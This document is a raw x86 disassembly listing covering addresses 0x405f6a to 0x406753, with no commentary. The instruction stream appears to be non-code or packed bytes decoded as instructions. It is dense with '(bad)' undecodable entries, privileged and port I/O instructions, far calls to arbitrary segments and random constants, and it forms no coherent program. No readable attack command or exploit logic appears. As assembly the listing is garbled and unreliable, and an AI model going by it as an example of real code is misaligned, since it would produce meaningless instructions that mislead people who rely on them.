  405f6a:	enter  0x13f8,0x88
  405f6e:	sbb    al,0xd0
  405f70:	fxch   st(6)
  405f72:	ins    BYTE PTR es:[edi],dx
  405f73:	fdiv   DWORD PTR [ebp+0x410e682]
  405f79:	xchg   ecx,eax
  405f7a:	jge    0x405fb2
  405f7c:	sti    
  405f7d:	cmp    edi,edi
  405f7f:	mov    WORD PTR [esi-0x7b560cf4],?
  405f85:	push   edi
  405f86:	cli    
  405f87:	cmp    dl,BYTE PTR [edx+edx*1]
  405f8a:	sar    al,0x2
  405f8d:	repnz daa 
  405f8f:	je     0x405f64
  405f91:	std    
  405f92:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405f93:	fcomip st,st(1)
  405f95:	enter  0x2047,0xe8
  405f99:	and    BYTE PTR [esi],0xab
  405f9c:	clc    
  405f9d:	inc    esi
  405f9e:	mov    ah,0x9d
  405fa0:	xor    esp,DWORD PTR [ebx+eax*1+0xe]
  405fa4:	add    edx,ebp
  405fa6:	lds    esi,FWORD PTR ss:0xbc18eff7
  405fad:	inc    eax
  405fae:	ret    0x7b25
  405fb1:	call   0x933:0xbf80a07b
  405fb8:	mov    eax,ds:0x45e19ffc
  405fbd:	lods   eax,DWORD PTR ds:[esi]
  405fbe:	xchg   ecx,eax
  405fbf:	sub    eax,DWORD PTR [ebp+ecx*8-0x6e]
  405fc3:	daa    
  405fc4:	inc    edi
  405fc5:	xchg   edx,esi
  405fc7:	mov    ch,0xfe
  405fc9:	(bad)  
  405fca:	jbe    0x406000
  405fcc:	xchg   ebx,eax
  405fcd:	(bad)  
  405fce:	jmp    0x442ffb47
  405fd3:	xchg   ebx,eax
  405fd4:	xchg   esp,eax
  405fd5:	imul   eax,DWORD PTR [edi+0x49479f41],0x850df09f
  405fdf:	shl    BYTE PTR [ecx],1
  405fe1:	or     ecx,esi
  405fe3:	cmp    dh,BYTE PTR [edi-0x6d]
  405fe6:	loopne 0x405fdb
  405fe8:	push   0xffffffc8
  405fea:	fs jp  0x405fa9
  405fed:	inc    ebp
  405fee:	mov    ecx,0x2a55e35f
  405ff3:	test   BYTE PTR [esp+eax*4-0x31c3bd21],al
  405ffa:	inc    eax
  405ffb:	mov    eax,0x61c37fb6
  406000:	fwait
  406001:	dec    esp
  406002:	dec    ebx
  406003:	mov    ch,0x60
  406005:	and    ch,bh
  406007:	dec    ebp
  406008:	dec    edi
  406009:	sub    DWORD PTR cs:[edi],0x33384df0
  406010:	(bad)  
  406011:	dec    ebx
  406012:	lea    ebp,[esp+ebx*4+0x28163018]
  406019:	js     0x405fd1
  40601b:	stos   DWORD PTR es:[edi],eax
  40601c:	mov    esi,DWORD PTR [esp+ebp*2-0x6d6ac8b7]
  406023:	aam    0xfd
  406025:	xchg   esp,eax
  406026:	jecxz  0x406012
  406028:	addr16 cs jno 0x406025
  40602c:	adc    al,0x8c
  40602e:	sti    
  40602f:	loopne 0x405ffe
  406031:	clc    
  406032:	stos   DWORD PTR es:[edi],eax
  406033:	dec    ecx
  406034:	stos   DWORD PTR es:[edi],eax
  406035:	lods   eax,DWORD PTR ds:[esi]
  406036:	pop    edi
  406037:	adc    eax,0x85e2d8bd
  40603c:	jl     0x40603f
  40603e:	jns    0x405fd2
  406040:	stc    
  406041:	pop    ecx
  406042:	sub    ecx,DWORD PTR [edx+edi*2]
  406045:	aad    0xd1
  406047:	xor    eax,0xc969304c
  40604c:	cli    
  40604d:	pushf  
  40604e:	push   0x298ebddf
  406053:	sub    DWORD PTR [edi],ebx
  406055:	jne    0x4060bc
  406057:	sub    eax,0x98fbc8cc
  40605c:	hlt    
  40605d:	enter  0x974f,0x3e
  406061:	enter  0xd106,0xe3
  406065:	loopne 0x4060b0
  406067:	pop    esi
  406068:	inc    esi
  406069:	out    0xcb,al
  40606b:	sub    esi,DWORD PTR [ebp-0x73e9500e]
  406071:	clc    
  406072:	(bad)  
  406073:	jecxz  0x406076
  406075:	icebp  
  406076:	retf   
  406077:	js     0x406015
  406079:	push   esi
  40607a:	jnp    0x406071
  40607c:	lds    edi,FWORD PTR [esi+ecx*4+0x5b]
  406080:	(bad)  [ebp+ebx*4-0x66b3128f]
  406087:	adc    al,0xba
  406089:	mov    ah,0x11
  40608b:	lods   eax,DWORD PTR ds:[esi]
  40608c:	pop    ds
  40608d:	jns    0x40607e
  40608f:	inc    edi
  406090:	outs   dx,DWORD PTR ds:[esi]
  406091:	sub    eax,0xe10f7413
  406096:	or     DWORD PTR [ecx-0x6e80dcea],0x70c22077
  4060a0:	xor    eax,0xc25db8c5
  4060a5:	or     ecx,DWORD PTR [edx-0x47]
  4060a8:	in     al,0x8b
  4060aa:	jnp    0x40607e
  4060ac:	test   BYTE PTR [edx-0x39e3e887],bl
  4060b2:	mov    edx,0x526e537a
  4060b7:	aad    0x67
  4060b9:	ret    0x460
  4060bc:	push   edx
  4060bd:	das    
  4060be:	fsubr  st,st(1)
  4060c0:	sbb    BYTE PTR [esi+eax*4-0x67fac2d7],0xe9
  4060c8:	mov    ecx,0xaf880a24
  4060cd:	dec    edx
  4060ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4060cf:	dec    ecx
  4060d0:	aaa    
  4060d1:	xchg   ebp,eax
  4060d2:	jg     0x406142
  4060d4:	xor    eax,0xc4856538
  4060d9:	lds    esi,FWORD PTR [edi+0x7a]
  4060dc:	jge    0x4060d5
  4060de:	loopne 0x406100
  4060e0:	mov    ds:0x4a7420d9,eax
  4060e5:	int3   
  4060e6:	out    dx,al
  4060e7:	sub    al,BYTE PTR [edi]
  4060e9:	xor    dh,BYTE PTR [ebp+0x42a17364]
  4060ef:	push   ds
  4060f0:	(bad)  
  4060f1:	std    
  4060f2:	call   0x9256:0xa9d90ff8
  4060f9:	daa    
  4060fa:	push   es
  4060fb:	sbb    al,dh
  4060fd:	pop    eax
  4060fe:	test   al,0x98
  406100:	sahf   
  406101:	(bad)  
  406102:	popf   
  406103:	xchg   ecx,eax
  406104:	imul   DWORD PTR [esi-0x3a54be6f]
  40610a:	sbb    eax,0x73b3f1bc
  40610f:	in     eax,0x29
  406111:	adc    DWORD PTR [ebx+0x78225a30],esp
  406117:	sbb    ebx,0xffffffe7
  40611a:	ja     0x4060c4
  40611c:	in     al,0x85
  40611e:	in     eax,0xe1
  406120:	adc    al,0x5c
  406122:	mov    ds:0xfe17e4d1,eax
  406127:	sbb    eax,DWORD PTR [esi-0x2d]
  40612a:	xor    DWORD PTR [edi-0x13],esi
  40612d:	push   ds
  40612e:	jo     0x406114
  406130:	push   ebp
  406131:	mov    edi,0x80e6e112
  406136:	fnstsw WORD PTR ss:[ecx+0x1a]
  40613a:	arpl   WORD PTR [esi],cx
  40613c:	pushf  
  40613d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40613e:	dec    ebp
  40613f:	pop    ecx
  406140:	shl    bh,1
  406142:	add    eax,0x8a50d83
  406147:	jns    0x4061a9
  406149:	loope  0x406146
  40614b:	add    edx,DWORD PTR ds:0x6d663c9e
  406151:	ficom  DWORD PTR [esi-0x13]
  406154:	dec    eax
  406155:	lods   eax,DWORD PTR ds:[esi]
  406156:	je     0x4061bf
  406158:	cmp    DWORD PTR [ecx-0x6da51cbb],esp
  40615e:	jmp    0x1a93:0xb0850292
  406165:	fistp  QWORD PTR [ecx-0x5c]
  406168:	(bad)  
  406169:	and    DWORD PTR [edx],eax
  40616b:	sbb    BYTE PTR [edx],bl
  40616d:	jl     0x4061cb
  40616f:	aad    0x6c
  406171:	push   esp
  406172:	dec    BYTE PTR [edx]
  406174:	out    0x14,eax
  406176:	jge    0x406117
  406178:	xchg   DWORD PTR [edx-0x79],esi
  40617b:	shl    DWORD PTR [edx-0x13a4dc45],cl
  406181:	inc    eax
  406182:	xchg   ecx,eax
  406183:	popf   
  406184:	fwait
  406185:	call   ecx
  406187:	mov    WORD PTR [eax],?
  406189:	retf   0x652f
  40618c:	dec    ebx
  40618d:	aad    0x46
  40618f:	cmp    ah,BYTE PTR [eax+ebx*1]
  406192:	jl     0x4061a9
  406194:	and    DWORD PTR [ecx-0x5522bb73],esp
  40619a:	into   
  40619b:	(bad)  
  40619c:	loop   0x4061c5
  40619e:	xchg   BYTE PTR ds:0x3b08abcf,al
  4061a4:	sbb    eax,0x3f578322
  4061a9:	push   0xb2113a0a
  4061ae:	pop    ss
  4061af:	jne    0x40613e
  4061b1:	mov    al,ds:0xfe42c586
  4061b6:	xlat   BYTE PTR ds:[ebx]
  4061b7:	nop
  4061b8:	sub    edx,DWORD PTR [ecx+0x48]
  4061bb:	es (bad) 
  4061bd:	scas   al,BYTE PTR es:[edi]
  4061be:	mov    al,0x45
  4061c0:	dec    DWORD PTR [ebx+0x25]
  4061c3:	out    dx,al
  4061c4:	xchg   esi,eax
  4061c5:	add    eax,eax
  4061c7:	je     0x406228
  4061c9:	cmp    ch,BYTE PTR [ecx]
  4061cb:	sub    eax,0x537e9e05
  4061d0:	imul   eax,esi,0x17c0bf53
  4061d6:	or     dl,BYTE PTR [ebx+0x64]
  4061d9:	js     0x406168
  4061db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4061dc:	dec    ebp
  4061dd:	push   esp
  4061de:	pop    edx
  4061df:	mov    esi,0x3ef0bbdc
  4061e4:	clc    
  4061e5:	cmp    di,WORD PTR [eax-0x59]
  4061e9:	call   DWORD PTR [ebp-0x57]
  4061ec:	es int 0x46
  4061ef:	mov    ebx,ebx
  4061f1:	fcomp  QWORD PTR [ecx]
  4061f3:	or     BYTE PTR [ebx],dh
  4061f5:	xchg   BYTE PTR [ebp+0x6c52b266],dh
  4061fb:	lods   al,BYTE PTR ds:[esi]
  4061fc:	out    0x5,eax
  4061fe:	js     0x4061ad
  406200:	popf   
  406201:	xchg   DWORD PTR [eax-0x34],esi
  406204:	rcl    DWORD PTR [esi+0x2a],0xd5
  406208:	sub    ecx,DWORD PTR [ebx]
  40620a:	ins    BYTE PTR es:[edi],dx
  40620b:	pusha  
  40620c:	out    0x52,eax
  40620e:	enter  0x21d2,0x70
  406212:	sbb    dl,dh
  406214:	ins    BYTE PTR es:[di],dx
  406216:	inc    ebp
  406217:	sbb    DWORD PTR [ecx+0x21],ecx
  40621a:	not    BYTE PTR [ebx]
  40621c:	mov    bh,0xa1
  40621e:	mov    ebx,0xba17580f
  406223:	pop    eax
  406224:	or     DWORD PTR [eax],esi
  406226:	sbb    cl,dl
  406228:	out    0xce,eax
  40622a:	lods   eax,DWORD PTR ds:[esi]
  40622b:	into   
  40622c:	pop    es
  40622d:	sbb    edi,DWORD PTR ds:0x8b8358b6
  406233:	repz sub esp,eax
  406236:	arpl   WORD PTR [ebx-0x41],dx
  406239:	jp     0x406230
  40623b:	(bad)  
  40623c:	mov    bh,0x61
  40623e:	cmp    eax,0x2aeadb22
  406243:	sub    eax,0x532f6611
  406248:	int    0x7c
  40624a:	jecxz  0x4061df
  40624c:	(bad)  
  40624d:	cmp    al,0x26
  40624f:	stc    
  406250:	mov    ds:0xc3b5086a,eax
  406255:	xchg   esp,eax
  406256:	int3   
  406257:	bnd js 0x406239
  40625a:	(bad)  
  40625b:	aad    0xaf
  40625d:	push   ss
  40625e:	push   esp
  40625f:	sbb    DWORD PTR [eax-0x5b03694e],eax
  406265:	scas   eax,DWORD PTR es:[edi]
  406266:	pop    ebx
  406267:	sti    
  406268:	xor    dl,al
  40626a:	push   edi
  40626b:	sti    
  40626c:	out    dx,al
  40626d:	adc    edx,DWORD PTR [esp+eax*4]
  406270:	push   ss
  406271:	popf   
  406272:	mov    al,ds:0x4b7e302b
  406277:	push   ss
  406278:	mov    ds:0xb0831f9f,al
  40627d:	rcl    BYTE PTR [edx-0x570ce59a],0x5
  406284:	in     al,0x33
  406286:	push   eax
  406287:	das    
  406288:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406289:	(bad)  
  40628a:	mov    al,ds:0x64717cfb
  40628f:	xchg   ebp,eax
  406290:	ds fwait
  406292:	repz jp 0x406279
  406295:	test   DWORD PTR [edi+0x58eb1638],edi
  40629b:	sbb    DWORD PTR [edx],eax
  40629d:	inc    eax
  40629e:	push   ebp
  40629f:	inc    ebp
  4062a0:	add    dl,ah
  4062a2:	sti    
  4062a3:	mov    eax,DWORD PTR [ebx-0x61]
  4062a6:	xchg   ecx,eax
  4062a7:	adc    eax,0x299405ad
  4062ac:	repz jg 0x406276
  4062af:	sbb    al,0x8c
  4062b1:	push   cs
  4062b2:	pop    eax
  4062b3:	jg     0x40627f
  4062b5:	(bad)  
  4062b6:	adc    DWORD PTR [esi+0x59],eax
  4062b9:	pop    esi
  4062ba:	mov    esp,0xbff835eb
  4062bf:	imul   esi,DWORD PTR [edi],0x86993589
  4062c5:	jecxz  0x4062d2
  4062c7:	out    0x43,eax
  4062c9:	jne    0x406251
  4062cb:	mov    edx,0xb6e48534
  4062d0:	pop    ebx
  4062d1:	fwait
  4062d2:	in     eax,0x8b
  4062d4:	push   edi
  4062d5:	xchg   ecx,ebp
  4062d7:	cs push es
  4062d9:	jbe    0x40631c
  4062db:	inc    ebp
  4062dc:	mov    dl,0xc3
  4062de:	test   esp,esi
  4062e0:	aas    
  4062e1:	xor    edi,edi
  4062e3:	sub    BYTE PTR [ebp-0x78],dh
  4062e6:	inc    esp
  4062e7:	pop    edi
  4062e8:	sub    DWORD PTR [eax],esp
  4062ea:	daa    
  4062eb:	mov    dl,0xdc
  4062ed:	mov    esi,edx
  4062ef:	xchg   edx,eax
  4062f0:	fsubr  DWORD PTR [ebp-0x19ef6d5]
  4062f6:	mov    ds:0x15fdd719,eax
  4062fb:	pop    esi
  4062fc:	xchg   ebp,eax
  4062fd:	inc    esi
  4062fe:	or     BYTE PTR [edx+edi*2-0x59],dl
  406302:	adc    eax,0x366fc7c7
  406307:	dec    edi
  406308:	daa    
  406309:	mov    cl,0x5d
  40630b:	push   ss
  40630c:	test   al,0x5
  40630e:	nop
  40630f:	fcom   DWORD PTR [ebx]
  406311:	lahf   
  406312:	in     eax,0x3d
  406314:	popa   
  406315:	mov    bl,0xec
  406317:	ins    DWORD PTR es:[edi],dx
  406318:	fild   QWORD PTR [esi]
  40631a:	jnp    0x406350
  40631c:	inc    esi
  40631d:	loopne 0x4062f1
  40631f:	mov    ch,0xf4
  406321:	shr    DWORD PTR [eax-0x7cdc3494],1
  406327:	cmp    esp,DWORD PTR [ebp+0x18]
  40632a:	mov    ah,0x83
  40632c:	shl    edx,0x68
  40632f:	ds pusha 
  406331:	(bad)  
  406332:	sbb    ebx,DWORD PTR [ebx]
  406334:	dec    eax
  406335:	xchg   dl,dl
  406337:	retf   0x3453
  40633a:	jae    0x4062e2
  40633c:	out    0x2b,eax
  40633e:	push   ebp
  40633f:	push   es
  406340:	(bad)  
  406341:	xor    dl,BYTE PTR [eax]
  406343:	cmp    dh,BYTE PTR [esi-0x3a9be5de]
  406349:	sti    
  40634a:	out    0xa7,al
  40634c:	fidivr WORD PTR [eax-0x71]
  40634f:	loope  0x406382
  406351:	scas   al,BYTE PTR es:[edi]
  406352:	imul   esi,DWORD PTR [edi],0xffffff8a
  406355:	mov    al,ds:0x74ff5cb3
  40635a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40635b:	push   es
  40635c:	(bad)  
  40635d:	gs cwde 
  40635f:	or     DWORD PTR [ebp+eiz*4+0x232658a2],ebx
  406366:	int3   
  406367:	es add al,0xc4
  40636a:	add    edx,0xc27c7472
  406370:	daa    
  406371:	sbb    al,0xb9
  406373:	call   0xf50a:0xdc61823a
  40637a:	push   ebx
  40637b:	mov    edi,edx
  40637d:	inc    edi
  40637e:	test   DWORD PTR [edx-0x5],edx
  406381:	out    dx,al
  406382:	(bad)  
  406383:	out    0xe1,al
  406385:	push   esi
  406386:	mov    eax,0xa08b5994
  40638b:	call   0xd050:0x2a53de85
  406392:	adc    ch,dh
  406394:	scas   eax,DWORD PTR es:[edi]
  406395:	js     0x40633f
  406397:	mov    BYTE PTR ds:0x772ff106,cl
  40639d:	mov    ecx,DWORD PTR [edi+0x0]
  4063a0:	ret    
  4063a1:	imul   ecx,DWORD PTR [edi+0x7],0x96455123
  4063a8:	test   DWORD PTR [ebx+0x77],edi
  4063ab:	ffreep st(5)
  4063ad:	and    al,0x2b
  4063af:	clc    
  4063b0:	sub    BYTE PTR [eax],bl
  4063b2:	mov    bh,0x9c
  4063b4:	mov    ch,0xf9
  4063b6:	fnsave [ebp+0x2c]
  4063b9:	xchg   cl,cl
  4063bb:	std    
  4063bc:	aas    
  4063bd:	pop    ebx
  4063be:	cld    
  4063bf:	dec    edi
  4063c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4063c1:	jno    0x4063d5
  4063c3:	int    0x84
  4063c5:	outs   dx,DWORD PTR ds:[esi]
  4063c6:	outs   dx,DWORD PTR ds:[esi]
  4063c7:	jmp    0x347b:0xdc5c9dbf
  4063ce:	mov    dh,0x4f
  4063d0:	inc    ebx
  4063d1:	mov    ds:0x92528f44,al
  4063d6:	ret    
  4063d7:	enter  0x7722,0xb
  4063db:	mov    eax,0x57b59c40
  4063e0:	pop    ss
  4063e1:	pop    esp
  4063e2:	cs mov ebx,0x42b449ea
  4063e8:	enter  0x990f,0xba
  4063ec:	pop    eax
  4063ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4063ee:	xor    al,0xc0
  4063f0:	loope  0x406374
  4063f2:	lahf   
  4063f3:	aad    0x56
  4063f5:	jne    0x406414
  4063f7:	adc    BYTE PTR [edi+0xea8e1b6],dh
  4063fd:	mov    bh,0x1a
  4063ff:	bound  ebp,QWORD PTR [esi-0x4]
  406402:	out    0xf1,eax
  406404:	mov    eax,0x2b4815e1
  406409:	xchg   esp,eax
  40640a:	adc    al,BYTE PTR [edx+ecx*2+0x5d2f7fd1]
  406411:	dec    esi
  406412:	das    
  406413:	mov    cl,BYTE PTR [eax-0x5f0acac6]
  406419:	sub    ch,BYTE PTR [esi]
  40641b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40641c:	fcomp  DWORD PTR [edx]
  40641e:	xchg   ebp,eax
  40641f:	push   ebx
  406420:	test   eax,0x9d16a203
  406425:	mov    bl,al
  406427:	clc    
  406428:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406429:	mov    dl,0x14
  40642b:	call   0xd654beae
  406430:	jae    0x4063d6
  406432:	mov    esp,0x6bba2557
  406437:	je     0x406434
  406439:	popf   
  40643a:	adc    eax,0xb831f209
  40643f:	call   0x9b731924
  406444:	mov    ecx,0x3787e518
  406449:	jle    0x40642f
  40644b:	mov    cl,BYTE PTR [ebp-0x60]
  40644e:	fwait
  40644f:	retf   0x4077
  406452:	int3   
  406453:	or     DWORD PTR [eax-0x52],0xccccc5a1
  40645a:	mov    dl,0xf6
  40645c:	ss and eax,0x44cff55a
  406462:	xlat   BYTE PTR ds:[ebx]
  406463:	and    WORD PTR [edx],sp
  406466:	jg     0x406407
  406468:	mov    ecx,0x384863c1
  40646d:	out    dx,eax
  40646e:	jo     0x4064e8
  406470:	pop    ebx
  406471:	in     eax,0x1d
  406473:	and    DWORD PTR [eax+edi*2+0x6f],esp
  406477:	es scas eax,DWORD PTR es:[edi]
  406479:	hlt    
  40647a:	or     edx,DWORD PTR [edi-0x5fd1486c]
  406480:	cmc    
  406481:	fs adc al,0xe2
  406484:	mov    dh,0x6f
  406486:	test   dh,ah
  406488:	pop    ss
  406489:	mov    esi,0xedc9bfbc
  40648e:	pop    edx
  40648f:	jae    0x4064b4
  406491:	push   es
  406492:	adc    esi,DWORD PTR [ecx+0x3d48a3b6]
  406498:	sub    BYTE PTR [edi-0x4d],dh
  40649b:	loopne 0x406439
  40649d:	in     al,dx
  40649e:	jbe    0x40644f
  4064a0:	fild   WORD PTR ds:0xdabcaebc
  4064a6:	in     eax,0x64
  4064a8:	out    dx,eax
  4064a9:	mov    esi,0x2eba1b70
  4064ae:	sbb    BYTE PTR [edi],0x9a
  4064b1:	or     edx,DWORD PTR gs:[eax+edi*8-0x4a436e12]
  4064b9:	test   eax,0x5ef4a5ec
  4064be:	shl    DWORD PTR [ebx],cl
  4064c0:	mov    BYTE PTR [eax],dh
  4064c2:	dec    edx
  4064c3:	sub    eax,0x6989b7ba
  4064c8:	inc    edx
  4064c9:	pusha  
  4064ca:	in     eax,0x90
  4064cc:	add    al,0x24
  4064ce:	pop    ds
  4064cf:	cwde   
  4064d0:	sub    al,0x3c
  4064d2:	stos   BYTE PTR es:[edi],al
  4064d3:	sbb    esi,DWORD PTR [ecx]
  4064d5:	sub    ecx,eax
  4064d7:	jmp    0x40652d
  4064d9:	mov    al,ds:0xe15ebad0
  4064de:	mov    al,ds:0xd3877028
  4064e3:	and    eax,0x41837c12
  4064e8:	and    al,0x0
  4064ea:	jecxz  0x406551
  4064ec:	xor    dh,bh
  4064ee:	dec    esi
  4064ef:	dec    ebp
  4064f0:	jecxz  0x40647a
  4064f2:	jb     0x4064e5
  4064f4:	in     eax,dx
  4064f5:	mov    ds:0x845adf05,eax
  4064fa:	jnp    0x406561
  4064fc:	mov    cl,0x44
  4064fe:	pop    eax
  4064ff:	cwde   
  406500:	mov    bh,0x8e
  406502:	and    DWORD PTR [esi],esp
  406504:	mov    eax,0x7fafdeb7
  406509:	jmp    0xf3ccf3e2
  40650e:	sti    
  40650f:	(bad)  
  406510:	sbb    cl,al
  406512:	mov    esi,0x3c43d046
  406517:	outs   dx,DWORD PTR ds:[esi]
  406518:	xor    DWORD PTR [ecx+0x53],0x5aa779a1
  40651f:	inc    ebx
  406520:	jne    0x406543
  406522:	gs mov ebp,0x80140084
  406528:	repz jns 0x406553
  40652b:	ss jmp 0x2921:0x56c22bdf
  406533:	mov    ds:0x47d06fa6,eax
  406538:	cmp    DWORD PTR [eax-0x48],esp
  40653b:	mov    fs:0x8adfccb9,eax
  406541:	xlat   BYTE PTR ds:[ebx]
  406542:	lahf   
  406543:	gs pop edi
  406545:	adc    ah,al
  406547:	dec    ebp
  406548:	jge    0x406517
  40654a:	sar    dl,1
  40654c:	ja     0x4064ea
  40654e:	shl    DWORD PTR [ebp+0x52ba2a47],1
  406554:	jg     0x406570
  406556:	push   cs
  406557:	jnp    0x4064fa
  406559:	adc    DWORD PTR [esi-0x63],ebx
  40655c:	in     al,0x7d
  40655e:	call   0xdb6a:0xe7faae50
  406565:	fdiv   QWORD PTR [edx+ebx*2]
  406568:	pushf  
  406569:	out    dx,eax
  40656a:	mov    esp,0x1ca04e40
  40656f:	ins    DWORD PTR es:[edi],dx
  406570:	pop    ecx
  406571:	(bad)  
  406572:	(bad)  
  406574:	mov    dh,ah
  406576:	test   BYTE PTR [esi],al
  406578:	enter  0x808b,0xfb
  40657c:	outs   dx,DWORD PTR ds:[esi]
  40657d:	pop    eax
  40657e:	mov    ds:0x1de03332,eax
  406583:	push   esi
  406584:	leave  
  406585:	push   cs
  406586:	rcl    esp,0xba
  406589:	repz les edx,FWORD PTR [ecx]
  40658c:	cmc    
  40658d:	retf   
  40658e:	mov    bl,0xa0
  406590:	mov    DWORD PTR [eax-0x6b],esi
  406593:	and    al,0xf1
  406595:	ins    BYTE PTR es:[edi],dx
  406596:	xchg   edx,eax
  406597:	cmp    al,0x98
  406599:	loope  0x406546
  40659b:	mov    al,0x75
  40659d:	push   es
  40659e:	pop    edi
  40659f:	add    cl,BYTE PTR [esi-0x2cbef73c]
  4065a5:	test   eax,0x7fddb139
  4065aa:	dec    ebp
  4065ab:	imul   DWORD PTR [eax-0x12548392]
  4065b1:	neg    DWORD PTR [ebx-0x5c]
  4065b4:	cmp    al,0x9d
  4065b6:	fldcw  WORD PTR [ecx-0xf6deb2]
  4065bc:	mov    ds:0x2ef39e3d,al
  4065c1:	adc    eax,0x60c5ea9c
  4065c6:	loop   0x4065c1
  4065c8:	ins    BYTE PTR es:[edi],dx
  4065c9:	push   ss
  4065ca:	fild   QWORD PTR [edx]
  4065cc:	mov    BYTE PTR ss:[edi+edx*1-0x13],al
  4065d1:	jae    0x4065b6
  4065d3:	(bad)  
  4065d4:	xchg   edx,eax
  4065d5:	outs   dx,DWORD PTR ds:[esi]
  4065d6:	mov    bl,0x97
  4065d8:	cmp    BYTE PTR [eax],dl
  4065da:	stc    
  4065db:	adc    esp,DWORD PTR [edi+0xc]
  4065de:	add    BYTE PTR [ebx],bh
  4065e0:	add    cl,BYTE PTR [ecx-0x71]
  4065e3:	add    al,0xcc
  4065e5:	sub    edi,0xcd201ba5
  4065eb:	ror    DWORD PTR [eax+0x49],cl
  4065ee:	clc    
  4065ef:	test   ah,0x25
  4065f2:	mov    edx,0xfcbe71d2
  4065f7:	xlat   BYTE PTR ds:[ebx]
  4065f8:	sbb    ch,BYTE PTR [edi+0x3d]
  4065fb:	dec    esp
  4065fc:	inc    esi
  4065fd:	mov    al,0x36
  4065ff:	leave  
  406600:	xchg   ebx,eax
  406601:	pusha  
  406602:	inc    ebp
  406603:	sub    BYTE PTR [esi],ah
  406605:	sub    eax,0x6b416e04
  40660a:	add    ch,BYTE PTR [esi+0x45]
  40660d:	xchg   esi,eax
  40660e:	push   ebx
  40660f:	push   0xc936b1ed
  406614:	mov    ss,WORD PTR ds:0x65eaf3f5
  40661a:	pop    eax
  40661b:	mov    dl,0x81
  40661d:	fimul  DWORD PTR [edi+ecx*4-0x7e1a5954]
  406624:	lahf   
  406625:	test   BYTE PTR [edi],bl
  406627:	lods   eax,DWORD PTR ds:[esi]
  406628:	add    eax,0x77d74445
  40662d:	or     al,0xa1
  40662f:	add    al,0x16
  406631:	gs out dx,al
  406633:	pop    ecx
  406634:	dec    edi
  406635:	repz dec edi
  406637:	jl     0x406661
  406639:	push   0x1a
  40663b:	or     al,0x20
  40663d:	mov    cl,0xd2
  40663f:	jmp    0x785ad28d
  406644:	das    
  406645:	adc    al,0x49
  406647:	lock mov bh,0x2
  40664a:	(bad)
  40664e:	and    ebx,DWORD PTR [edi+0x77c8dcad]
  406654:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406655:	bound  ecx,QWORD PTR [eax+0x14dbbabf]
  40665b:	rcl    BYTE PTR [edi-0x1a820700],0x6d
  406662:	mov    edx,ecx
  406664:	add    bh,BYTE PTR [ecx+0x37]
  406667:	fadd   DWORD PTR [edx]
  406669:	push   0x4dccfa36
  40666e:	xor    al,0xa7
  406670:	inc    ebx
  406671:	fs inc esp
  406673:	cs (bad) 
  406675:	rcr    ecx,cl
  406677:	repnz dec edi
  406679:	cs adc al,0x86
  40667c:	sub    al,0xc8
  40667e:	jbe    0x4066f5
  406680:	jns    0x406604
  406682:	jno    0x406630
  406684:	imul   ecx,DWORD PTR [ebx+ebp*4-0x1035163c],0x18552c96
  40668f:	fldcw  WORD PTR [edi]
  406691:	rcr    bl,1
  406693:	xor    eax,0xc6df53b2
  406698:	fdiv   DWORD PTR [ebp-0x2a575dca]
  40669e:	fisub  WORD PTR [edi-0x36107547]
  4066a4:	popf   
  4066a5:	mov    esp,0x55f60318
  4066aa:	xchg   esp,eax
  4066ab:	imul   edi,DWORD PTR [edi+0xb],0xffffff98
  4066af:	sub    ax,0xf8c9
  4066b3:	jmp    0x16a7edbc
  4066b8:	xchg   ecx,eax
  4066b9:	inc    edx
  4066ba:	call   0xa544:0xf8e84206
  4066c1:	bound  eax,QWORD PTR [ebp-0x3e]
  4066c4:	dec    ebx
  4066c5:	lahf   
  4066c6:	mov    edi,0x96578243
  4066cb:	mov    bh,0x1f
  4066cd:	mov    BYTE PTR [edi-0x62],dh
  4066d0:	ret    
  4066d1:	sub    ah,al
  4066d3:	pop    edx
  4066d4:	leave  
  4066d5:	add    dh,bh
  4066d7:	sub    al,ah
  4066d9:	xchg   ebp,eax
  4066da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4066db:	clc    
  4066dc:	add    DWORD PTR [ebx-0x28dad736],esi
  4066e2:	repz cmp al,BYTE PTR [edi]
  4066e5:	outs   dx,DWORD PTR ds:[esi]
  4066e6:	jo     0x406723
  4066e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4066e9:	(bad)  
  4066ed:	imul   edi,DWORD PTR [ecx+0x23952963],0xffffffbc
  4066f4:	outs   dx,BYTE PTR ds:[esi]
  4066f5:	fnstsw WORD PTR [esi]
  4066f7:	pop    ebp
  4066f8:	std    
  4066f9:	maskmovq mm3,(bad)
  4066fa:	neg    DWORD PTR [ecx-0x47]
  4066fd:	mov    al,0x95
  4066ff:	or     BYTE PTR [ecx-0x2301fe60],dh
  406705:	sar    BYTE PTR [edi],cl
  406707:	pop    eax
  406708:	ffreep st(0)
  40670a:	dec    esp
  40670b:	adc    DWORD PTR [esi+0x88c5b44],edi
  406711:	cmc    
  406712:	inc    edx
  406713:	(bad)  
  406714:	stos   BYTE PTR es:[edi],al
  406715:	neg    esp
  406717:	jbe    0x406782
  406719:	fnstenv [eax-0x1e]
  40671c:	mov    edx,0xe3e3b8df
  406721:	xor    BYTE PTR [esp+eiz*2+0x64],dh
  406725:	mov    ah,bl
  406727:	push   edi
  406728:	push   edi
  406729:	cmp    edi,DWORD PTR [edi+0x727fecc]
  40672f:	stc    
  406730:	call   0xd385b6ba
  406735:	(bad)  
  406737:	ror    BYTE PTR [eax],0x8c
  40673a:	and    eax,0x871376c2
  40673f:	arpl   WORD PTR [ebx+0x613d0a07],cx
  406745:	fisubr DWORD PTR gs:[ebx-0x38]
  406749:	cs stos DWORD PTR es:[edi],eax
  40674b:	mul    DWORD PTR [ebx+0x1]
  40674e:	push   edx
  40674f:	std    
  406750:	fidiv  WORD PTR fs:[edx]
  406753:	cmovg  edx,DWORD PTR [edx+ebx*2-0x468dc4b9]
